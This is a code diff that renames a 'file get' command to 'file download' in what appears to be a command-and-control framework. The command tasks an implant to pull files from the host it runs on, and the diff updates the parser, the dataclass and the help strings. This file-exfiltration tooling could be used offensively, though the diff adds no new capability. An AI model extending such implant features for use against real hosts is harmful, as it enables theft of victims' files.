@@ -98,7 +98,7 @@ async def task_tree(command, args, implant_uuid):
                 StratGet,
                 StratList,
                 StratActive,
-                FileGet,
+                FileDownload,
                 Exit,
             ]
             descriptions: list = get_description_of_dataclasses(dataclasses)
@@ -204,10 +204,10 @@ async def task_tree(command, args, implant_uuid):
                 )
 
         case "file":
-            if args.startswith("get"):
-                file_path = args[4:]  # Extract file path after "get "
+            if args.startswith("download"):
+                file_path = args[9:]  # Extract file path after "download"
                 try:
-                    task = FileGet(
+                    task = FileDownload(
                         implant_uuid=implant_uuid, file_path=file_path
                     ).to_task()
                     return (ResultType.TASK, task)
@@ -216,7 +216,7 @@ async def task_tree(command, args, implant_uuid):
             else:
                 return (
                     ResultType.ERROR,
-                    "Invalid file command. Use `file get <file_path>`",
+                    "Invalid file command. Use `file download <file_path>`",
                 )
         case "exit":
             try:
@@ -455,12 +455,12 @@ class StratActive:
 
 
 @dataclass(frozen=True)
-class FileGet:
+class FileDownload:
     R"""
-    Get a file from the host the implant is running on. Ex: `file get C:\\Users\\user\\file.txt`
+    Get a file from the host the implant is running on. Ex: `file download C:\\Users\\user\\file.txt`
     """
 
-    command_name = "file get"
+    command_name = "file download"
     implant_uuid: str
     file_path: str
 
@@ -468,7 +468,7 @@ class FileGet:
         """Automatically run something when the dataclass is created."""
         if not self.file_path:
             raise ParseError(
-                "The 'file_path' argument cannot be None or empty. Ex: `file get <file_path>`: `file get C:\\Users\\user\\file.txt`"
+                "The 'file_path' argument cannot be None or empty. Ex: `file download <file_path>`: `file download C:\\Users\\user\\file.txt`"
             )
 
     def to_task(self) -> dict:
